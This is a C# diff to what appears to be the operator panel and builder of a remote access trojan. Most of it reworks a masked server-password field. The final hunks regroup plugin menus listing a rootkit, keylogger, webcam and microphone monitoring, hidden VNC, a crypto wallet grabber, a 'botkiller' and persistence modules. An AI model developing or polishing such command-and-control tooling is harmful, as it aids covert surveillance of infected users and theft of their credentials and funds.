@@ -39,7 +39,7 @@ namespace WpfApp
         private bool _pwSyncing;
         private string _builderActualPassword = "";
         private bool _builderPwHidden = true;
-        private TextBox _httpPwReveal;
+        private bool _httpPwHidden = true;
         private TcpServer _tcpServer;
 
         // Plugin system
@@ -151,8 +151,8 @@ namespace WpfApp
             _pluginManager = new PluginManager(this, _pluginHost);
 
             builderPasswordBox.TextChanged += (s, e) => SyncPwToServer();
-            HttpPasswordBox.PasswordChanged += (s, e) => SyncPwToBuilder();
-            SetupPasswordReveal(HttpPasswordBox, ref _httpPwReveal, "httpPwReveal");
+            HttpPasswordBox.TextChanged += (s, e) => SyncPwToBuilder();
+            SetupHttpPasswordBox();
 
             AddAutoTaskRootkitMenuItems();
         }
@@ -161,7 +161,12 @@ namespace WpfApp
         {
             if (_pwSyncing) return;
             _pwSyncing = true;
-            HttpPasswordBox.Password = _builderActualPassword;
+            if (!_builderPwHidden)
+                _builderActualPassword = builderPasswordBox.Text;
+            if (_httpPwHidden)
+                HttpPasswordBox.Text = new string('●', _builderActualPassword.Length);
+            else
+                HttpPasswordBox.Text = _builderActualPassword;
             _pwSyncing = false;
         }
 
@@ -169,7 +174,8 @@ namespace WpfApp
         {
             if (_pwSyncing) return;
             _pwSyncing = true;
-            _builderActualPassword = HttpPasswordBox.Password;
+            if (!_httpPwHidden)
+                _builderActualPassword = HttpPasswordBox.Text;
             if (_builderPwHidden)
                 builderPasswordBox.Text = new string('●', _builderActualPassword.Length);
             else
@@ -177,33 +183,17 @@ namespace WpfApp
             _pwSyncing = false;
         }
 
-        void SetupPasswordReveal(PasswordBox pwBox, ref TextBox revealRef, string name)
+        void SetupHttpPasswordBox()
         {
-            var parent = (Grid)pwBox.Parent;
-            int col = Grid.GetColumn(pwBox);
+            _httpPwHidden = true;
+            HttpPasswordBox.Text = new string('●', _builderActualPassword.Length);
 
-            var txtBox = new TextBox
-            {
-                Name = name,
-                Text = pwBox.Password,
-                Padding = pwBox.Padding,
-                FontSize = pwBox.FontSize,
-                MinHeight = pwBox.MinHeight,
-                VerticalContentAlignment = VerticalAlignment.Center,
-                HorizontalAlignment = pwBox.HorizontalAlignment,
-                Visibility = Visibility.Collapsed,
-                BorderThickness = new Thickness(1),
-                Background = pwBox.Background,
-                Foreground = pwBox.Foreground,
-                BorderBrush = pwBox.BorderBrush,
-                CaretBrush = pwBox.Foreground
-            };
-            revealRef = txtBox;
-            Grid.SetColumn(txtBox, col);
-            parent.Children.Add(txtBox);
+            HttpPasswordBox.PreviewTextInput += HttpPw_PreviewTextInput;
+            HttpPasswordBox.PreviewKeyDown += HttpPw_PreviewKeyDown;
+            DataObject.AddPastingHandler(HttpPasswordBox, HttpPw_Paste);
 
-            pwBox.PasswordChanged += (s, e) => txtBox.Text = pwBox.Password;
-            txtBox.TextChanged += (s, e) => pwBox.Password = txtBox.Text;
+            var parent = (Grid)HttpPasswordBox.Parent;
+            int col = Grid.GetColumn(HttpPasswordBox);
 
             var brdrBrush = (SolidColorBrush)Application.Current.Resources["BorderBrush"];
             var txtDimBrush = (SolidColorBrush)Application.Current.Resources["TextSecondaryBrush"];
@@ -236,8 +226,16 @@ namespace WpfApp
 
             eyeBtnBorder.Child = eyeBtn;
 
-            eyeBtn.Checked += (s, e) => { pwBox.Visibility = Visibility.Collapsed; txtBox.Visibility = Visibility.Visible; };
-            eyeBtn.Unchecked += (s, e) => { txtBox.Visibility = Visibility.Collapsed; pwBox.Visibility = Visibility.Visible; };
+            eyeBtn.Checked += (s, e) =>
+            {
+                _httpPwHidden = false;
+                HttpPasswordBox.Text = _builderActualPassword;
+            };
+            eyeBtn.Unchecked += (s, e) =>
+            {
+                _httpPwHidden = true;
+                HttpPasswordBox.Text = new string('●', _builderActualPassword.Length);
+            };
             eyeBtn.MouseEnter += (s, e) => { eyeBtnBorder.Background = sfLightBrush; eyeBtnBorder.BorderBrush = txtDimBrush; };
             eyeBtn.MouseLeave += (s, e) => { eyeBtnBorder.Background = Brushes.Transparent; eyeBtnBorder.BorderBrush = brdrBrush; };
 
@@ -375,6 +373,74 @@ namespace WpfApp
             e.Handled = true;
         }
 
+        void HttpPw_PreviewTextInput(object sender, TextCompositionEventArgs e)
+        {
+            if (!_httpPwHidden) return;
+            var tb = (TextBox)sender;
+            int start = tb.SelectionStart;
+            int selLen = tb.SelectionLength;
+            _builderActualPassword = _builderActualPassword.Remove(start, selLen).Insert(start, e.Text);
+            tb.Text = new string('●', _builderActualPassword.Length);
+            tb.CaretIndex = start + e.Text.Length;
+            e.Handled = true;
+        }
+
+        void HttpPw_PreviewKeyDown(object sender, KeyEventArgs e)
+        {
+            if (!_httpPwHidden) return;
+            var tb = (TextBox)sender;
+            int start = tb.SelectionStart;
+            int selLen = tb.SelectionLength;
+            if (e.Key == Key.Back)
+            {
+                if (selLen > 0)
+                {
+                    _builderActualPassword = _builderActualPassword.Remove(start, selLen);
+                    tb.Text = new string('●', _builderActualPassword.Length);
+                    tb.CaretIndex = start;
+                }
+                else if (start > 0)
+                {
+                    _builderActualPassword = _builderActualPassword.Remove(start - 1, 1);
+                    tb.Text = new string('●', _builderActualPassword.Length);
+                    tb.CaretIndex = start - 1;
+                }
+                e.Handled = true;
+            }
+            else if (e.Key == Key.Delete)
+            {
+                if (selLen > 0)
+                {
+                    _builderActualPassword = _builderActualPassword.Remove(start, selLen);
+                    tb.Text = new string('●', _builderActualPassword.Length);
+                    tb.CaretIndex = start;
+                }
+                else if (start < _builderActualPassword.Length)
+                {
+                    _builderActualPassword = _builderActualPassword.Remove(start, 1);
+                    tb.Text = new string('●', _builderActualPassword.Length);
+                    tb.CaretIndex = start;
+                }
+                e.Handled = true;
+            }
+        }
+
+        void HttpPw_Paste(object sender, DataObjectPastingEventArgs e)
+        {
+            if (!_httpPwHidden) return;
+            if (e.DataObject.GetDataPresent(DataFormats.Text))
+            {
+                var tb = (TextBox)sender;
+                string text = (string)e.DataObject.GetData(DataFormats.Text);
+                int start = tb.SelectionStart;
+                int selLen = tb.SelectionLength;
+                _builderActualPassword = _builderActualPassword.Remove(start, selLen).Insert(start, text);
+                tb.Text = new string('●', _builderActualPassword.Length);
+                tb.CaretIndex = start + text.Length;
+            }
+            e.Handled = true;
+        }
+
         // ==================== LOG LEVELS ====================
 
         public void AppendVerboseLog(string message)
@@ -422,7 +488,13 @@ namespace WpfApp
                                 listenportTextBox.Text = settings.ListenPort;
 
                             if (!string.IsNullOrWhiteSpace(settings.ServerPassword))
-                                HttpPasswordBox.Password = settings.ServerPassword;
+                            {
+                                _pwSyncing = true;
+                                _builderActualPassword = settings.ServerPassword;
+                                HttpPasswordBox.Text = new string('●', _builderActualPassword.Length);
+                                _httpPwHidden = true;
+                                _pwSyncing = false;
+                            }
                         });
 
                         AppendLog("Loaded saved encryption key and settings.");
@@ -476,7 +548,7 @@ namespace WpfApp
                     settings.ServerIp = builderIpTextBox.Text;
                     settings.Password = _builderActualPassword;
                     settings.ListenPort = listenportTextBox.Text;
-                    settings.ServerPassword = HttpPasswordBox.Password;
+                    settings.ServerPassword = _builderActualPassword;
                     settings.Theme = ThemeManager.CurrentTheme;
                     settings.AutoListen = chkAutoListen.IsChecked == true;
                     settings.ShowPopup = chkShowPopup.IsChecked == true;
@@ -2104,8 +2176,13 @@ namespace WpfApp
                 if (string.IsNullOrWhiteSpace(listenportTextBox.Text) && !string.IsNullOrWhiteSpace(builderPortTextBox.Text))
                     listenportTextBox.Text = builderPortTextBox.Text;
 
-                if (string.IsNullOrWhiteSpace(HttpPasswordBox.Password) && !string.IsNullOrWhiteSpace(_builderActualPassword))
-                    HttpPasswordBox.Password = _builderActualPassword;
+                if (string.IsNullOrWhiteSpace(HttpPasswordBox.Text) && !string.IsNullOrWhiteSpace(_builderActualPassword))
+                {
+                    _pwSyncing = true;
+                    HttpPasswordBox.Text = new string('●', _builderActualPassword.Length);
+                    _httpPwHidden = true;
+                    _pwSyncing = false;
+                }
             }
 
             if (e.AddedItems.Count > 0 && e.AddedItems[0] == networkTab)
@@ -2811,7 +2888,7 @@ namespace WpfApp
 
             try
             {
-                string serverPwd = HttpPasswordBox?.Password?.Trim() ?? "";
+                string serverPwd = _builderActualPassword?.Trim() ?? "";
                 _tcpServer = new TcpServer(this, port, _serverCertificate, serverPwd);
 
                 _tcpServer.SetPluginHost(_pluginHost);
@@ -2872,7 +2949,7 @@ namespace WpfApp
 
         private void SetPasswordButton_Click(object sender, RoutedEventArgs e)
         {
-            string password = HttpPasswordBox.Password.Trim();
+            string password = _builderActualPassword.Trim();
             if (string.IsNullOrWhiteSpace(password))
             {
                 AppendLog("Please enter a password.");
@@ -3950,11 +4027,10 @@ namespace WpfApp
 
                 var pluginGroups = new[]
                 {
-                    ("🖥  Administration",       new[] { "shell", "filemgr", "regedit", "procmgr", "rootkit" }),
-                    ("🌐  Network & Proxy",      new[] { "socks5" }),
-                    ("📹  Surveillance",         new[] { "screenmon", "keylog", "webcam", "micmon" }),
-                    ("💻  Remote Access",        new[] { "hvnc" }),
-                    ("🔍  Grabber",              new[] { "walletgrab", "botkiller" }),
+                    ("🖥  System Shell",          new[] { "shell", "filemgr", "regedit", "procmgr" }),
+                    ("🔗  Remote Access",         new[] { "hvnc", "socks5", "screenmon" }),
+                    ("📡  Surveillance",          new[] { "keylog", "webcam", "micmon" }),
+                    ("🎯  Collection",            new[] { "walletgrab", "sysinfo" }),
                 };
 
                 var loadedPlugins = _pluginHost.LoadedPlugins;
@@ -3978,8 +4054,19 @@ namespace WpfApp
                         contextMenu.Items.Add(groupMenu);
                 }
 
+                var adminGroup = new MenuItem { Header = "🔐  Admin Operations" };
+                var adminPluginIds = new[] { "rootkit", "resetsurvival" };
+                foreach (var id in adminPluginIds)
+                {
+                    if (!loadedPlugins.TryGetValue(id, out var plugin)) continue;
+                    remaining.Remove(id);
+                    adminGroup.Items.Add(BuildPluginMenuItem(plugin));
+                }
+                if (adminGroup.Items.Count > 0)
+                    contextMenu.Items.Add(adminGroup);
+
                 var clientGroup = new MenuItem { Header = "⚙️  Management" };
-                var clientPluginIds = new[] { "persistence", "update", "sysinfo", "resetsurvival" };
+                var clientPluginIds = new[] { "persistence", "update", "botkiller" };
                 foreach (var id in clientPluginIds)
                 {
                     if (!loadedPlugins.TryGetValue(id, out var plugin)) continue;
@@ -3991,7 +4078,7 @@ namespace WpfApp
 
                 if (remaining.Count > 0)
                 {
-                    var miscGroup = new MenuItem { Header = "🧩  Other" };
+                    var miscGroup = new MenuItem { Header = "🎮  Misc" };
                     foreach (var id in remaining.ToList())
                     {
                         if (!loadedPlugins.TryGetValue(id, out var plugin)) continue;
